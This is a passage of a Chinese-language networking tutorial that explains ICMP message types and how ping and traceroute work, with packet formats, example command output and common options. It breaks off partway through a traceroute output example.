class="hljs-attribute">┌─────────┬────────────────────┬─────────────────┐</span><br><span class="hljs-attribute">│  Type   │       名称         │      用途       │</span><br><span class="hljs-attribute">├─────────┼────────────────────┼─────────────────┤</span><br><span class="hljs-attribute">│    0    │  回显应答          │  ping响应       │</span><br><span class="hljs-attribute">│    3    │  目标不可达        │  错误报告       │</span><br><span class="hljs-attribute">│    4    │  源抑制            │  拥塞控制       │</span><br><span class="hljs-attribute">│    5    │  重定向            │  路由优化       │</span><br><span class="hljs-attribute">│    8    │  回显请求          │  ping请求       │</span><br><span class="hljs-attribute">│   11    │  超时              │  TTL过期        │</span><br><span class="hljs-attribute">│   12    │  参数问题          │  IP头部错误     │</span><br><span class="hljs-attribute">│   13    │  时间戳请求        │  时钟同步       │</span><br><span class="hljs-attribute">│   14    │  时间戳应答        │  时钟同步       │</span><br><span class="hljs-attribute">└─────────┴────────────────────┴─────────────────┘</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">常用类型详解：</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Type 0/8</span><span class="hljs-punctuation">:</span> <span class="hljs-string">回显应答/请求（Echo Reply/Request）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ping使用</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">测试连通性</span><br><br><span class="hljs-attribute">Type 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">目标不可达（Destination Unreachable）</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">网络不可达</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">主机不可达</span><br><span class="hljs-attribute">Code 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">协议不可达</span><br><span class="hljs-attribute">Code 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">端口不可达</span><br><span class="hljs-attribute">Code 4</span><span class="hljs-punctuation">:</span> <span class="hljs-string">需要分片但设置了DF标志</span><br><span class="hljs-attribute">Code 6</span><span class="hljs-punctuation">:</span> <span class="hljs-string">目标网络未知</span><br><br><span class="hljs-attribute">Type 5</span><span class="hljs-punctuation">:</span> <span class="hljs-string">重定向（Redirect）</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">网络重定向</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">主机重定向</span><br><br><span class="hljs-attribute">Type 11</span><span class="hljs-punctuation">:</span> <span class="hljs-string">超时（Time Exceeded）</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TTL在传输中过期</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">分片重组超时</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-ping工作原理"><a href="#2-ping工作原理" class="headerlink" title="2. ping工作原理"></a>2. ping工作原理</h2><h3 id="2-1-ping是什么？"><a href="#2-1-ping是什么？" class="headerlink" title="2.1 ping是什么？"></a>2.1 ping是什么？</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ping = Packet Internet Groper（分组网络探测器）<br><br>功能：<br><span class="hljs-bullet">-</span> 测试网络连通性<br><span class="hljs-bullet">-</span> 测量往返时间（RTT）<br><span class="hljs-bullet">-</span> 检测丢包率<br><span class="hljs-bullet">-</span> 诊断网络问题<br><br>工作原理：<br><span class="hljs-bullet">1.</span> 发送ICMP回显请求（Type 8）<br><span class="hljs-bullet">2.</span> 目标主机收到后<br><span class="hljs-bullet">3.</span> 返回ICMP回显应答（Type 0）<br><span class="hljs-bullet">4.</span> 计算往返时间<br><br>生活比喻：<br>像在山谷里喊&quot;喂～&quot;，听到回声就知道：<br><span class="hljs-bullet">-</span> 对面有山（主机存在）<br><span class="hljs-bullet">-</span> 距离多远（RTT）<br><span class="hljs-bullet">-</span> 回声清晰度（网络质量）<br></code></pre></td></tr></table></figure><h3 id="2-2-ping报文格式"><a href="#2-2-ping报文格式" class="headerlink" title="2.2 ping报文格式"></a>2.2 ping报文格式</h3><p><strong>ICMP回显请求&#x2F;应答</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     Type      |     Code      |          Checksum             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|           Identifier          |        Sequence Number        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                           Data...                             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>请求：<br>Type = 8 (Echo Request)<br>Code = 0<br><br>应答：<br>Type = 0 (Echo Reply)<br>Code = 0<br><br>Identifier (标识符):<br><span class="hljs-bullet">- </span>进程ID<br><span class="hljs-bullet">- </span>区分不同ping进程<br><br>Sequence Number (序列号):<br><span class="hljs-bullet">- </span>标识每个请求<br><span class="hljs-bullet">- </span>递增<br><span class="hljs-bullet">- </span>用于匹配请求和应答<br><span class="hljs-bullet">- </span>检测丢包和乱序<br><br>Data (数据):<br><span class="hljs-bullet">- </span>可变长度<br><span class="hljs-bullet">- </span>通常包含时间戳<br><span class="hljs-bullet">- </span>用于计算RTT<br><span class="hljs-bullet">- </span>默认56字节（Linux）或32字节（Windows）<br></code></pre></td></tr></table></figure><h3 id="2-3-ping工作流程"><a href="#2-3-ping工作流程" class="headerlink" title="2.3 ping工作流程"></a>2.3 ping工作流程</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs markdown">完整流程：<br><br><span class="hljs-bullet">1.</span> 用户执行：ping www.google.com<br><br><span class="hljs-bullet">2.</span> DNS解析：<br>   www.google.com → 142.250.185.14<br><br><span class="hljs-bullet">3.</span> 构造ICMP报文：<br><span class="hljs-bullet">   -</span> Type = 8 (Echo Request)<br><span class="hljs-bullet">   -</span> Code = 0<br><span class="hljs-bullet">   -</span> ID = 进程ID<br><span class="hljs-bullet">   -</span> Seq = 1, 2, 3... (递增)<br><span class="hljs-bullet">   -</span> Data = 时间戳 + 填充数据<br><br><span class="hljs-bullet">4.</span> 封装IP数据包：<br><span class="hljs-bullet">   -</span> 源IP：本机IP<br><span class="hljs-bullet">   -</span> 目标IP：142.250.185.14<br><span class="hljs-bullet">   -</span> 协议：ICMP (1)<br><span class="hljs-bullet">   -</span> TTL：64（默认）<br><br><span class="hljs-bullet">5.</span> 发送数据包<br><br><span class="hljs-bullet">6.</span> 等待响应（超时时间通常1-5秒）<br><br><span class="hljs-bullet">7.</span> 收到ICMP回显应答：<br><span class="hljs-bullet">   -</span> Type = 0 (Echo Reply)<br><span class="hljs-bullet">   -</span> 验证ID和Seq匹配<br><span class="hljs-bullet">   -</span> 计算RTT = 当前时间 - 时间戳<br><br><span class="hljs-bullet">8.</span> 显示结果：<br>   64 bytes from 142.250.185.14: icmp<span class="hljs-emphasis">_seq=1 ttl=55 time=15.2 ms</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">9. 重复步骤3-8（默认无限次，可指定次数）</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">10. 统计信息：</span><br><span class="hljs-emphasis">    - 发送数量</span><br><span class="hljs-emphasis">    - 接收数量</span><br><span class="hljs-emphasis">    - 丢包率</span><br><span class="hljs-emphasis">    - RTT（最小/平均/最大/标准差）</span><br></code></pre></td></tr></table></figure><h3 id="2-4-ping输出解析"><a href="#2-4-ping输出解析" class="headerlink" title="2.4 ping输出解析"></a>2.4 ping输出解析</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs routeros">示例输出：<br><br>$<span class="hljs-built_in"> ping </span>-c 4 google.com<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>google.com (142.250.185.14) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.2 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=14.8 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.5 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=4 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.1 ms<br><br>--- google.com<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3005ms<br>rtt min/avg/max/mdev = 14.827/15.150/15.532/0.261 ms<br><br>输出解析：<br><br>第一行：<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>google.com (142.250.185.14) 56(84) bytes of data.<br>- 目标域名和IP<br>- 56字节数据 + 28字节头部（IP 20 + ICMP 8）= 84字节<br><br>响应行：<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.2 ms<br>- 64字节：IP数据包大小（实际ICMP部分）<br>- <span class="hljs-keyword">from</span>：来源主机和IP<br>- icmp_seq：序列号（从1开始）<br>- ttl：剩余跳数（初始64，经过9跳，剩55）<br>- time：往返时间（RTT）<br><br>统计信息：<br>- 4 packets transmitted：发送4个<br>- 4 received：收到4个<br>- 0% packet loss：丢包率0%<br>- time 3005ms：总耗时<br>- rtt min/avg/max/mdev：RTT最小/平均/最大/标准差<br><br>常见情况：<br><br>1. 正常响应：<br>   64 bytes <span class="hljs-keyword">from</span> <span class="hljs-built_in">..</span>.: <span class="hljs-attribute">time</span>=15.2 ms<br>   → 网络正常<br><br>2. 请求超时：<br>   Request timeout <span class="hljs-keyword">for</span> icmp_seq 1<br>   → 包丢失或被过滤<br><br>3. 目标不可达：<br>   <span class="hljs-keyword">From</span> 192.168.1.1: <span class="hljs-attribute">icmp_seq</span>=1 Destination Host Unreachable<br>   → 路由不可达或主机关闭<br><br>4. TTL过期：<br>   <span class="hljs-keyword">From</span> 10.0.0.1: <span class="hljs-attribute">icmp_seq</span>=1 Time <span class="hljs-keyword">to</span> live exceeded<br>   → TTL耗尽，通常是路由环路<br><br>5. 网络不可达：<br>  <span class="hljs-built_in"> Network </span>is unreachable<br>   → 本地路由表无路由<br></code></pre></td></tr></table></figure><h3 id="2-5-ping常用选项"><a href="#2-5-ping常用选项" class="headerlink" title="2.5 ping常用选项"></a>2.5 ping常用选项</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs routeros">常用参数：<br><br>-c count (Linux) 或 -n count (Windows)<br>发送指定数量的包<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-c 10 google.com<br><br>-i interval<br>设置发送间隔（秒）<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-i 0.2 google.com  # 每0.2秒一次<br><br>-s size<br>设置数据包大小（字节）<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-s 1000 google.com<br><br>-t ttl (Linux) 或 -i ttl (Windows)<br>设置TTL值<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-t 10 google.com<br><br>-W timeout<br>设置超时时间（秒）<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-W 1 google.com<br><br>-f (flood ping, 需要root)<br>快速发送，不等待响应<br>sudo<span class="hljs-built_in"> ping </span>-f google.com<br><br>-q (quiet)<br>只显示统计信息<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-q -c 100 google.com<br><br>实用技巧：<br><br>1. 持续监控连接质量：<br>  <span class="hljs-built_in"> ping </span>-i 0.2 gateway<br>   每0.2秒ping一次网关<br><br>2. 测试大包传输：<br>  <span class="hljs-built_in"> ping </span>-s 1472 target<br>   测试MTU（1500 - 28 = 1472）<br><br>3. 快速测试连通性：<br>  <span class="hljs-built_in"> ping </span>-c 1 -W 1 target<br>   只发一个包，1秒超时<br><br>4. 限制TTL测试路由：<br>  <span class="hljs-built_in"> ping </span>-t 5 target<br>   看5跳内是否可达<br></code></pre></td></tr></table></figure><hr><h2 id="3-traceroute工作原理"><a href="#3-traceroute工作原理" class="headerlink" title="3. traceroute工作原理"></a>3. traceroute工作原理</h2><h3 id="3-1-traceroute是什么？"><a href="#3-1-traceroute是什么？" class="headerlink" title="3.1 traceroute是什么？"></a>3.1 traceroute是什么？</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">traceroute = 路由追踪<br><br>功能：<br><span class="hljs-bullet">- </span>发现数据包传输路径<br><span class="hljs-bullet">- </span>显示每一跳路由器<br><span class="hljs-bullet">- </span>测量每一跳的延迟<br><span class="hljs-bullet">- </span>诊断路由问题<br><br>生活比喻：<br>像是快递追踪：<br><span class="hljs-bullet">- </span>北京集散中心 → 延迟10ms<br><span class="hljs-bullet">- </span>石家庄分拨中心 → 延迟25ms<br><span class="hljs-bullet">- </span>郑州转运中心 → 延迟40ms<br><span class="hljs-bullet">- </span>武汉配送站 → 延迟55ms<br><span class="hljs-bullet">- </span>目的地 → 延迟70ms<br><br>用途：<br>✅ 网络故障定位<br>✅ 路由路径分析<br>✅ 性能瓶颈诊断<br>✅ 网络拓扑发现<br></code></pre></td></tr></table></figure><h3 id="3-2-traceroute实现原理"><a href="#3-2-traceroute实现原理" class="headerlink" title="3.2 traceroute实现原理"></a>3.2 traceroute实现原理</h3><p><strong>核心技巧：利用TTL</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">原理：<br>TTL（Time <span class="hljs-keyword">To</span> Live）递减机制<br>- 每经过一个路由器，TTL减1<br>- TTL减到0时，路由器丢弃包<br>- 路由器发送ICMP超时消息（Type 11）<br><br>traceroute利用这个机制：<br><br>第1轮：<span class="hljs-attribute">TTL</span>=1<br>┌──────┐  <span class="hljs-attribute">TTL</span>=1   ┌──────┐  <span class="hljs-attribute">TTL</span>=0   ┌──────┐<br>│ 主机 │ ────────&gt;│ R1   │ ────────&gt;│ R2   │<br>└──────┘          └──────┘          └──────┘<br>                     │<br>                     │ ICMP Time Exceeded<br>                     ▼<br>                  记录R1地址和时间<br><br>第2轮：<span class="hljs-attribute">TTL</span>=2<br>┌──────┐  <span class="hljs-attribute">TTL</span>=2   ┌──────┐  <span class="hljs-attribute">TTL</span>=1   ┌──────┐  <span class="hljs-attribute">TTL</span>=0   ┌──────┐<br>│ 主机 │ ────────&gt;│ R1   │ ────────&gt;│ R2   │ ────────&gt;│ R3   │<br>└──────┘          └──────┘          └──────┘          └──────┘<br>                                        │<br>                                        │ ICMP Time Exceeded<br>                                        ▼<br>                                    记录R2地址和时间<br><br>第3轮：<span class="hljs-attribute">TTL</span>=3<br><span class="hljs-built_in">..</span>.依此类推，直到到达目标主机<br><br>目标主机响应：<br>- 如果是UDP：端口不可达（Type 3, Code 3）<br>- 如果是ICMP：回显应答（Type 0）<br></code></pre></td></tr></table></figure><p><strong>两种实现方式</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 传统方式（UDP）：<br><span class="hljs-bullet">   -</span> 发送UDP包到高端口（33434+）<br><span class="hljs-bullet">   -</span> TTL从1开始递增<br><span class="hljs-bullet">   -</span> 中间路由器：返回ICMP超时<br><span class="hljs-bullet">   -</span> 目标主机：返回ICMP端口不可达<br><span class="hljs-bullet">   -</span> Linux/Unix默认使用<br><br><span class="hljs-bullet">2.</span> ICMP方式：<br><span class="hljs-bullet">   -</span> 发送ICMP回显请求（Type 8）<br><span class="hljs-bullet">   -</span> TTL从1开始递增<br><span class="hljs-bullet">   -</span> 中间路由器：返回ICMP超时<br><span class="hljs-bullet">   -</span> 目标主机：返回ICMP回显应答<br><span class="hljs-bullet">   -</span> Windows默认使用（tracert）<br><br>对比：<br>┌─────────────┬──────────────┬──────────────┐<br>│    特性     │   UDP方式    │   ICMP方式   │<br>├─────────────┼──────────────┼──────────────┤<br>│ 发送包类型  │    UDP       │    ICMP      │<br>│ 目标响应    │  端口不可达  │   回显应答   │<br>│ 防火墙友好  │     较差     │     较好     │<br>│ 默认平台    │  Linux/Unix  │   Windows    │<br>└─────────────┴──────────────┴──────────────┘<br></code></pre></td></tr></table></figure><h3 id="3-3-traceroute工作流程"><a href="#3-3-traceroute工作流程" class="headerlink" title="3.3 traceroute工作流程"></a>3.3 traceroute工作流程</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs markdown">详细流程（UDP方式）：<br><br><span class="hljs-bullet">1.</span> 用户执行：traceroute google.com<br><br><span class="hljs-bullet">2.</span> DNS解析：获取目标IP<br><br><span class="hljs-bullet">3.</span> 初始化：<br><span class="hljs-bullet">   -</span> TTL = 1<br><span class="hljs-bullet">   -</span> 目标端口 = 33434（通常）<br><br><span class="hljs-bullet">4.</span> 第1跳：<br>   a. 发送3个UDP包（TTL=1）到端口33434、33435、33436<br>   b. 第一个路由器收到，TTL减1变成0<br>   c. 路由器丢弃包，返回ICMP超时（Type 11, Code 0）<br>   d. 记录路由器IP和3个响应时间<br>   e. 显示：1  192.168.1.1  1.5ms  1.3ms  1.4ms<br><br><span class="hljs-bullet">5.</span> 第2跳：<br>   a. TTL = 2<br>   b. 发送3个UDP包<br>   c. 经过第一个路由器（TTL=2→1）<br>   d. 第二个路由器收到（TTL=1→0）<br>   e. 返回ICMP超时<br>   f. 显示：2  10.0.0.1  5.2ms  5.1ms  5.3ms<br><br><span class="hljs-bullet">6.</span> 继续递增TTL，重复步骤5<br><br><span class="hljs-bullet">7.</span> 到达目标：<br><span class="hljs-bullet">   -</span> 目标主机收到UDP包<br><span class="hljs-bullet">   -</span> 端口33434通常未使用<br><span class="hljs-bullet">   -</span> 返回ICMP端口不可达（Type 3, Code 3）<br><span class="hljs-bullet">   -</span> traceroute识别到达目标<br><span class="hljs-bullet">   -</span> 停止<br><br><span class="hljs-bullet">8.</span> 超时处理：<br><span class="hljs-bullet">   -</span> 如果2秒内未收到响应<br><span class="hljs-bullet">   -</span> 显示 * 表示超时<br><span class="hljs-bullet">   -</span> 可能原因：<br><span class="hljs-bullet">     *</span> 路由器配置不响应ICMP<br><span class="hljs-bullet">     *</span> 防火墙过滤<br><span class="hljs-bullet">     *</span> 包丢失<br><br><span class="hljs-bullet">9.</span> 显示统计信息<br><br>特殊情况：<br><br><span class="hljs-bullet">1.</span> * * <span class="hljs-emphasis">*（三个星号）</span><br><span class="hljs-emphasis">   - 该跳无响应</span><br><span class="hljs-emphasis">   - 可能被防火墙过滤</span><br><span class="hljs-emphasis">   - 或路由器配置不回复ICMP</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">2. !H / !N / !P</span><br><span class="hljs-emphasis">   - !H: 主机不可达</span><br><span class="hljs-emphasis">   - !N: 网络不可达</span><br><span class="hljs-emphasis">   - !P: 协议不可达</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">3. 相同IP重复出现</span><br><span class="hljs-emphasis">   - 可能是负载均衡</span><br><span class="hljs-emphasis">   - 或ECMP（等价多路径）</span><br></code></pre></td></tr></table></figure><h3 id="3-4-traceroute输出解析"><a href="#3-4-traceroute输出解析" class="headerlink" title="3.4 traceroute输出解析"></a>3.4 traceroute输出解析</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">示例输出：<br><br>$ traceroute google.com<br>traceroute to google.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">60</span> byte packets<br> <span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>)  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">2</span>  <span 